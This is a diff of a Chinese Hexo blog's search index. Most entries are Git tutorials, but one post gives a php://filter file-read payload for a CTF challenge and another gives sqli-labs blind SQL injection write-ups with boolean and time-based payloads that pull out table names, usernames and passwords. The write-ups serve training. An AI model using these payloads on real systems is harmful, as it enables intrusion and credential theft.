+<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
+<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
+<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
+<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
+<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
+<p>现在状态为</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
+<p>若想要恢复，即输入 <code>git add delete.txt</code>和<code>git commit -m &quot;备注&quot; delete.txt</code>来确定删除</p>
+<p>记录不可磨灭（除非删除本地库），所以可根据记录找回删除文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113009537.png" alt="image-20220110113009537"></p>
+<h1 id="添加到暂存区的删除文件找回"><a href="#添加到暂存区的删除文件找回" class="headerlink" title="添加到暂存区的删除文件找回"></a>添加到暂存区的删除文件找回</h1><p>新建文件，并提交到本地库</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113802079.png" alt="image-20220110113802079"></p>
+<p>然后删除文件，并添加到暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110113841345.png" alt="image-20220110113841345"></p>
+<p>若要找回此文件，则输入指令：<code>git reset --hard HEAD</code>(本质仍然是版本回归)</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110114018441.png" alt="image-20220110114018441"></p>
+<p><strong><u>总结：删除文件找回的前提是，删除前文件存在时的状态提交到了本地库</u></strong></p>
+<h1 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h1><p>命令：<code>git diff 文件名.拓展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191213839.png" alt="image-20220110191213839"></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
+<p>上图表示第一行删去了9个a</p>
+<p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
       </tags>
   </entry>
   <entry>
@@ -2028,6 +1966,94 @@
       </tags>
   </entry>
   <entry>
+    <title>Git的分支管理级Git的基本原理</title>
+    <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
+<li><p>分支是主干（master）的复制品，可以进行试错，可以删除，也也可以合并回主干</p>
+</li>
+<li><p>分支更加专业化，分支之间互不干扰</p>
+</li>
+<li><p>可以多人同时开发不同分支，增加开发效率</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h1><p>查看所有分支命令：<code>git branch -v</code></p>
+<p>创建新的分支：<code>git branch 分支名</code></p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195627374.png" alt="image-20220110195627374"></p>
+<p>分支的切换：<code>git checkout 分支名</code></p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195754653.png" alt="image-20220110195754653"></p>
+<p>用hot_fix分支修改文件</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200141530.png" alt="image-20220110200141530"></p>
+<p>若要将hot_fix分支合并到master分支上，则要切换到master分支上（即被合并的分支）</p>
+<p>合并命令：<code>git merge 分支名</code></p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200612093.png" alt="image-20220110200612093"></p>
+<p>当分支有冲突时（即两个分支都对同一地方进行了修改）</p>
+<p>首先要产生冲突</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110201910358.png" alt="image-20220110201910358"></p>
+<p>产生冲突后看产生冲突的文件内容</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202059391.png" alt="image-20220110202059391"></p>
+<p>删除多于内容后（可在阅览模式下双击d键删除一行）</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202632027.png" alt="image-20220110202632027"></p>
+<p>保留自己想要的内容，然后<code>git add 文件名</code>，<code>git commit -m &quot;备注&quot;</code>提交</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110203321229.png" alt="image-20220110203321229"></p>
+<h1 id="Git基本原理"><a href="#Git基本原理" class="headerlink" title="Git基本原理"></a>Git基本原理</h1><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p>哈希是一个系列的加密算法，各个不同的哈希加密虽然加密强度不同，但是有以下几个共同点</p>
+<ul>
+<li>不管输入的数据量有多大，输入同一个哈希算法，得到的加密结果长度固定。</li>
+<li>哈希加密确定，输入数据有变化，输出数据一定有变化，而且变化程度很大。</li>
+<li>哈希算法确定，输入数据确定，输出数据能够保证不变。</li>
+<li>哈希算法不可逆</li>
+</ul>
+<p>Git底层采用的是SHA-1算法。</p>
+<p>哈希算法可以被用来验证文件。原理如下</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111095840028.png" alt="image-20220111095840028"></p>
+<p>Git就是靠这种操作从根本上保证数据的完整性。</p>
+<h2 id="Git保存版本机制"><a href="#Git保存版本机制" class="headerlink" title="Git保存版本机制"></a>Git保存版本机制</h2><p>首先讲一下集中式版本控制工具的文件管理机制</p>
+<p>以文件变更列表的方式存储信息。这类系统将它们保存的信息看作时一组基本文件和每个文件随时间逐步积累的差异。也就是只保存更改的地方</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111101222004.png" alt="image-20220111101222004"></p>
+<p>然后是Git的文件管理机制</p>
+<p>Git把数据看作是小型文件系统的一组快照，每次提交更新时，Git都会对当前的全部文件制作一个快照并保存这个快照的索引。为了高效，<u>如果文件没有修改，Git不再重新存储该文件</u>。所以Git的工作方式可以称之为快照流。</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103051918.png" alt="image-20220111103051918"></p>
+<p>Git的提交对象</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103632587.png" alt="image-20220111103632587"></p>
+<p>提交对象及其父对象形成的链条</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103823481.png" alt="image-20220111103823481"></p>
+<h2 id="Git分支管理机制"><a href="#Git分支管理机制" class="headerlink" title="Git分支管理机制"></a>Git分支管理机制</h2><p>分支的创建</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111104023440.png" alt="image-20220111104023440"></p>
+<p>testing指针和master指针在同一链条，而不是为testing单搞一条链，节省了储存空间</p>
+<p>分支切换（改变HEAD指针的位置）</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111121831087.png" alt="image-20220111121831087"></p>
+<p>当分支文件不一样时，才会出现分支</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
+<p><strong>Git在本地的版本控制就完结了</strong></p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php://filter 协议</title>
+    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
+<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
+<span id="more"></span>
+
+<p>转base64编码：<code>convert.base64-encode</code></p>
+<p>转大写：<code>string.toupper</code></p>
+<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
+<p>例题：</p>
+<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
+<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
+<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
+<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
+<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
+]]></content>
+      <tags>
+        <tag>php协议</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于读书</title>
     <url>/2021/11/23/hello-world/</url>
     <content><![CDATA[<p>这是我的第一条博客!在这里我会更新自己觉得有价值的东西，希望这对你能有一些帮助。<br>嗯… 也不知道到写些什么，那就摘一篇我认为很有价值的文章吧！</p>
@@ -2128,30 +2154,6 @@
 ]]></content>
       <tags>
         <tag>杂谈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php://filter 协议</title>
-    <url>/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<h1 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a>php://filter 协议</h1><p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/20210711135416691.png" alt="asd"></p>
-<p><strong>1</strong>是格式<br><strong>2</strong>是可选参数，有read和write，字面意思就是读和写（如果不写可选参数2(read或write)，那么网页会自动匹配一个合适的read或write）<br><strong>3</strong>是过滤器。主要有四种：字符串过滤器，转换过滤器，压缩过滤器，加密过滤器。filter里可以用一或多个过滤器（中间用|隔开），这也为解题提供了多种方法，灵活运用过滤器是解题的关键。这里的过滤器是把文件flag.php里的代码转换（convert）为base64编码（encode）<br><strong>4</strong>是必选参数，后面写你要处理的文件名<br>常用过滤器</p>
-<span id="more"></span>
-
-<p>转base64编码：<code>convert.base64-encode</code></p>
-<p>转大写：<code>string.toupper</code></p>
-<p>php://filter还可以绕过，大概就是把不希望执行的语句先编码，这个编码类型可以破坏语句的正常执行<br>（比如base64编码只有64个字符，如果被编码的语句字符在64个字符里找不到对应的，就会忽略，略过它继续编码），然后再解码，这样就可以绕过这个语句了。</p>
-<p>例题：</p>
-<h1 id="ACTF2020-新生赛Include"><a href="#ACTF2020-新生赛Include" class="headerlink" title="ACTF2020 新生赛Include"></a>ACTF2020 新生赛Include</h1><p>打开题目后审视代码，发现啥也没有</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
-<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
-<p>构造：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
-<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
-<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
-<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
-]]></content>
-      <tags>
-        <tag>php协议</tag>
       </tags>
   </entry>
   <entry>
@@ -2293,74 +2295,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqlilabs第8-10关（盲注）</title>
-    <url>/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/</url>
-    <content><![CDATA[<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>?id=1’报错，?id=1’–+不报错，说明是单引号包裹。</p>
-<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p>这里要用到substr函数和ascii函数，顺便了解一下length函数</p>
-<p>substr函数是截取某一字段的第几个字母，ascii函数是将某一字符转变成ascii码的形式，而length函数则是判断字符串的长度。</p>
-<span id="more"></span>
-
-<p><code>?id=1&#39; and (select ascii(substr(database(),1,1)))=1--+</code></p>
-<p>这段语句表示，选取数据库名称的第一个字符，并判断其ascii码是否是1，如果是1则有回显，如果不是1就没有回显。<strong>第一个1表示从第一个字符截取，第二个1表示截取1位。</strong></p>
-<p><code>id=1&#39; and length(database())=8--+</code></p>
-<p>这段语句表示数据库名称的字符串长度为8，如果是8则有回显，如果不是8就没有回显（这条语句在本题没有使用）</p>
-<p>使用bp设置好变量，如图，开始爆破。</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103005854.png" alt="image-20220126103005854"></p>
-<p>爆破结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103224065.png" alt="image-20220126103224065"></p>
-<p>可得数据库</p>
-<p>115,101,99,117,114,105,116,121=&gt;security</p>
-<p>这里推荐去<a href="https://www.sojson.com/ascii.html">这里</a>按ctrl+f直接搜ascii对应字符。</p>
-<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>套路还是一样</p>
-<p><code>?id=1&#39;  and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)))=1--+</code></p>
-<p>这句话表示，选择数据库security中从第0行开始的第一行（也就是第0行）的字符串的第一个字符，并看该字符的ascii码是否为1。</p>
-<p>设置如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105448848.png" alt="image-20220126105448848"></p>
-<p>结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105504606.png" alt="image-20220126105504606"></p>
-<p>然后把上述的从第0行开始改成从第1行开始（也就是第二行的字符串，也就是第二个表名）</p>
-<p>修改和结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105854694.png" alt="image-20220126105854694"></p>
-<p>当改成4时，所有结果的长度均一致，说明不存在第5个表</p>
-<p>总结</p>
-<p>第一个数据表 101,109,97,105,108,115 =&gt;emails</p>
-<p>第二个数据表 114,101,102,101,114,101,114,115 =&gt;referers</p>
-<p>第三个数据表 117,97,103,101,110,116,115 =&gt;uagents</p>
-<p>第四个数据表 117,115,101,114,115 =&gt;users</p>
-<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1)))=1--+</code></p>
-<p>这里就不解释了，差不多。</p>
-<p>最后爆出字段为</p>
-<p>第一个字段 105,100 =&gt;id</p>
-<p>第二个字段 117,115,101,114,110,97,109,101 =&gt;username</p>
-<p>第三个字段 112,97,115,115,119,111,114,100 =&gt;password</p>
-<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>爆破第一个username</p>
-<p><code>?id=1&#39; and (select ascii(substr((select username from users limit 0,1),1,1)))=1--+</code></p>
-<p>爆破第一个password</p>
-<p><code>?id=1&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))=1--+</code></p>
-<p>其余的只是改一下行数，然后再进行爆破即可。</p>
-<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><strong>时间盲注：适用于无论语句正确与否，返回结果都一样。所以可以通过页面响应时间来判断注入的内容是否正确。</strong></p>
-<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p><code>?id=1&#39; and sleep(5)--+</code></p>
-<p>方法都一样，就是后面加一个<code>and sleep(5)</code>，来判断页面回显。</p>
-<p>经过判断，该题为单引号闭合</p>
-<h2 id="爆库-1"><a href="#爆库-1" class="headerlink" title="爆库"></a>爆库</h2><p><code>?id=1&#39; and if(ascii(substr(database(),1,1))=1,sleep(5),1)--+</code></p>
-<p>这里用到了if语句<code>if(条件,语句1,语句2)</code>这里是如果数据库名称的第一个字符的ascii码是1，则沉睡5秒，否则执行1（也就是不沉睡），配合bp使用，结果如下</p>
-<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126162028989.png" alt="image-20220126162028989"></p>
-<h2 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h2><p><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<p>指令和结果都和第8题大同小异，不再解释</p>
-<h2 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<p>指令和结果都和第8题大同小异，不再解释</p>
-<h2 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h2><p>爆第一个用户名</p>
-<p><code>?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<p>爆第一个密码</p>
-<p><code>?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
-<h1 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h1><p>除了闭合方式为双引号型，其余和第9关都一样</p>
-<p><code>?id=1&quot; and sleep(5)--+</code></p>
-]]></content>
-      <tags>
-        <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlilabs第一关</title>
     <url>/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/</url>
     <content><![CDATA[<h1 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h1><ol>
@@ -2427,6 +2361,74 @@
 <p>这句话的意思是在security库的users表中找出所有username与对应的password，这里面的0x5c是\的十六进制编码。也可以是别的</p>
 <p><img src="/2022/01/19/sqlilabs%E7%AC%AC%E4%B8%80%E5%85%B3/image-20220120005243708.png" alt="image-20220120005243708"></p>
 <p>完成。</p>
+]]></content>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqlilabs第8-10关（盲注）</title>
+    <url>/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><h2 id="判断闭合类型"><a href="#判断闭合类型" class="headerlink" title="判断闭合类型"></a>判断闭合类型</h2><p>?id=1’报错，?id=1’–+不报错，说明是单引号包裹。</p>
+<h2 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h2><p>这里要用到substr函数和ascii函数，顺便了解一下length函数</p>
+<p>substr函数是截取某一字段的第几个字母，ascii函数是将某一字符转变成ascii码的形式，而length函数则是判断字符串的长度。</p>
+<span id="more"></span>
+
+<p><code>?id=1&#39; and (select ascii(substr(database(),1,1)))=1--+</code></p>
+<p>这段语句表示，选取数据库名称的第一个字符，并判断其ascii码是否是1，如果是1则有回显，如果不是1就没有回显。<strong>第一个1表示从第一个字符截取，第二个1表示截取1位。</strong></p>
+<p><code>id=1&#39; and length(database())=8--+</code></p>
+<p>这段语句表示数据库名称的字符串长度为8，如果是8则有回显，如果不是8就没有回显（这条语句在本题没有使用）</p>
+<p>使用bp设置好变量，如图，开始爆破。</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103005854.png" alt="image-20220126103005854"></p>
+<p>爆破结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126103224065.png" alt="image-20220126103224065"></p>
+<p>可得数据库</p>
+<p>115,101,99,117,114,105,116,121=&gt;security</p>
+<p>这里推荐去<a href="https://www.sojson.com/ascii.html">这里</a>按ctrl+f直接搜ascii对应字符。</p>
+<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><p>套路还是一样</p>
+<p><code>?id=1&#39;  and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)))=1--+</code></p>
+<p>这句话表示，选择数据库security中从第0行开始的第一行（也就是第0行）的字符串的第一个字符，并看该字符的ascii码是否为1。</p>
+<p>设置如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105448848.png" alt="image-20220126105448848"></p>
+<p>结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105504606.png" alt="image-20220126105504606"></p>
+<p>然后把上述的从第0行开始改成从第1行开始（也就是第二行的字符串，也就是第二个表名）</p>
+<p>修改和结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126105854694.png" alt="image-20220126105854694"></p>
+<p>当改成4时，所有结果的长度均一致，说明不存在第5个表</p>
+<p>总结</p>
+<p>第一个数据表 101,109,97,105,108,115 =&gt;emails</p>
+<p>第二个数据表 114,101,102,101,114,101,114,115 =&gt;referers</p>
+<p>第三个数据表 117,97,103,101,110,116,115 =&gt;uagents</p>
+<p>第四个数据表 117,115,101,114,115 =&gt;users</p>
+<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1)))=1--+</code></p>
+<p>这里就不解释了，差不多。</p>
+<p>最后爆出字段为</p>
+<p>第一个字段 105,100 =&gt;id</p>
+<p>第二个字段 117,115,101,114,110,97,109,101 =&gt;username</p>
+<p>第三个字段 112,97,115,115,119,111,114,100 =&gt;password</p>
+<h2 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h2><p>爆破第一个username</p>
+<p><code>?id=1&#39; and (select ascii(substr((select username from users limit 0,1),1,1)))=1--+</code></p>
+<p>爆破第一个password</p>
+<p><code>?id=1&#39; and (select ascii(substr((select password from users limit 0,1),1,1)))=1--+</code></p>
+<p>其余的只是改一下行数，然后再进行爆破即可。</p>
+<h1 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h1><p><strong>时间盲注：适用于无论语句正确与否，返回结果都一样。所以可以通过页面响应时间来判断注入的内容是否正确。</strong></p>
+<h2 id="判断闭合方式"><a href="#判断闭合方式" class="headerlink" title="判断闭合方式"></a>判断闭合方式</h2><p><code>?id=1&#39; and sleep(5)--+</code></p>
+<p>方法都一样，就是后面加一个<code>and sleep(5)</code>，来判断页面回显。</p>
+<p>经过判断，该题为单引号闭合</p>
+<h2 id="爆库-1"><a href="#爆库-1" class="headerlink" title="爆库"></a>爆库</h2><p><code>?id=1&#39; and if(ascii(substr(database(),1,1))=1,sleep(5),1)--+</code></p>
+<p>这里用到了if语句<code>if(条件,语句1,语句2)</code>这里是如果数据库名称的第一个字符的ascii码是1，则沉睡5秒，否则执行1（也就是不沉睡），配合bp使用，结果如下</p>
+<p><img src="/2022/01/26/sqlilabs%E7%AC%AC8-10%E5%85%B3/image-20220126162028989.png" alt="image-20220126162028989"></p>
+<h2 id="爆表-1"><a href="#爆表-1" class="headerlink" title="爆表"></a>爆表</h2><p><code>?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<p>指令和结果都和第8题大同小异，不再解释</p>
+<h2 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h2><p><code>?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<p>指令和结果都和第8题大同小异，不再解释</p>
+<h2 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h2><p>爆第一个用户名</p>
+<p><code>?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<p>爆第一个密码</p>
+<p><code>?id=1&#39; and if(ascii(substr((select password from users limit 0,1),1,1))=1,sleep(5),1)--+</code></p>
+<h1 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h1><p>除了闭合方式为双引号型，其余和第9关都一样</p>
+<p><code>?id=1&quot; and sleep(5)--+</code></p>
 ]]></content>
       <tags>
         <tag>SQL</tag>
@@ -2832,42 +2834,6 @@
       </tags>
   </entry>
   <entry>
-    <title>刷题记录-7</title>
-    <url>/2022/04/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-7/</url>
-    <content><![CDATA[<h1 id="Pretty-Horrible-Program-1"><a href="#Pretty-Horrible-Program-1" class="headerlink" title="Pretty Horrible Program 1"></a>Pretty Horrible Program 1</h1><p>这道题水得很，虽然我没有完全看懂源码，但也能稍作注释</p>
-<span id="more"></span>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;bingus&#x27;</span>];  <span class="comment">//把get到的值赋给input</span></span><br><span class="line">    <span class="variable">$to_replace</span> = <span class="string">&#x27;bingus&#x27;</span>;  <span class="comment">//让to_replace为bingus</span></span><br><span class="line">    <span class="variable">$clean_string</span> = preg_replace(<span class="string">&quot;/<span class="subst">$to_replace</span>/&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$input</span>);<span class="comment">//让clean_string为input中把bingus替换为空格后的值</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your string is: <span class="subst">$clean_string</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$clean_string</span> == <span class="variable">$to_replace</span>) &#123;</span><br><span class="line">      <span 